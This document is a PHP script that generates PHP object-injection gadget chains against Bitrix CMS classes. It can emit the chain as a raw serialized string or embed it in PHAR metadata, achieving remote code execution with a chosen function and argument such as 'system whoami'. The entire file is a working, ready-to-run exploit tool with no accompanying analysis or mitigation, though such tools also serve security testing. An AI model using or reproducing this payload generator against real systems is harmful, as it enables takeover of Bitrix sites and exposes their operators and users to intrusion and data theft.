<?php

function gen($items) {
    foreach ($items as $name => $props) {
        $code = '';

        if (strpos($name, "\\") !== false) {
            $parts = explode("\\", $name);
            $cls = array_pop($parts);
            $ns = implode("\\", $parts);
            $code .= "namespace $ns;\n";
        } else {
            $cls = $name;
        }

        $code .= "class $cls {\n";

        foreach ($props as $prop) {
            $code .= "\t";

            if ($prop[0] === '*') {
                $code .= "private $" . substr($prop, 1);
            } else if ($prop[0] == '#') {
                $code .= "protected $" . substr($prop, 1);
            } else {
                $code .= "public $" . $prop;
            }

            $code .= ";\n";
        }

        $code .= "\tfunction __set(\$name, \$value) { \$this->{\$name} = \$value; }\n";

        $code .= "}";

        eval($code);
    }
}


function rce1($func, $arg) {
  gen([
      'Bitrix\Main\Entity\Result' => ['#isSuccess', '#errors'],
      'Bitrix\Main\UserConsent\DataProvider' => ['#data'],
      'CAdminDraggableBlockEngine' => ['#engines', '#args'],
  ]);

  $a = new CAdminDraggableBlockEngine();
  $a->engines = array(array('check' => $func));
  $a->args = $arg;

  $dp = new Bitrix\Main\UserConsent\DataProvider();
  $dp->data = array($a, 'check');

  $res = new Bitrix\Main\Entity\Result();
  $res->errors = $dp;
  $res->isSuccess = false;

  return $res;
}


function rce2($func, $arg) {
  gen([
      'Bitrix\Main\Entity\Result' => ['#isSuccess', '#errors'],
      'Bitrix\Main\DB\ArrayResult' => ['#resource', '#converters'],
      'Bitrix\Main\Type\Dictionary' => ['#values'],
  ]);

  $ar = new Bitrix\Main\DB\ArrayResult();
  $ar->resource = array(array($arg));
  $ar->converters = array($func);

  $dict = new Bitrix\Main\Type\Dictionary();
  $dict->values = $ar;

  $res = new Bitrix\Main\Entity\Result();
  $res->errors = $dict;
  $res->isSuccess = false;

  return $res;
}


if (count($argv) != 5) {
  echo "Usage: php gadgets.php rce1|rce2 func arg raw|phar-name\n";
  echo "Exampe: php gadgets.php rce1 system whoami raw\n";
  echo "        php gadgets.php rce2 system whoami test.phar\n";
  die();
}

list($file, $gadget, $func, $arg, $enc) = $argv;

switch ($gadget) {

case 'rce1':
  $data = rce1($func, $arg);
  break;

case 'rce2':
  $data = rce2($func, $arg);
  break;

default:
  echo "Unknown gadget: $gadget";
  die();
}

switch ($enc) {
case 'raw':
  echo serialize($data);
  break;

default:
  $phar = new Phar($enc);
  $phar->startBuffering();
  $phar->addFromString('test.txt', 'text');
  $phar->setStub('<?php __HALT_COMPILER(); ? >');
  $phar->setMetadata($data);
  $phar->stopBuffering();
  break;

}
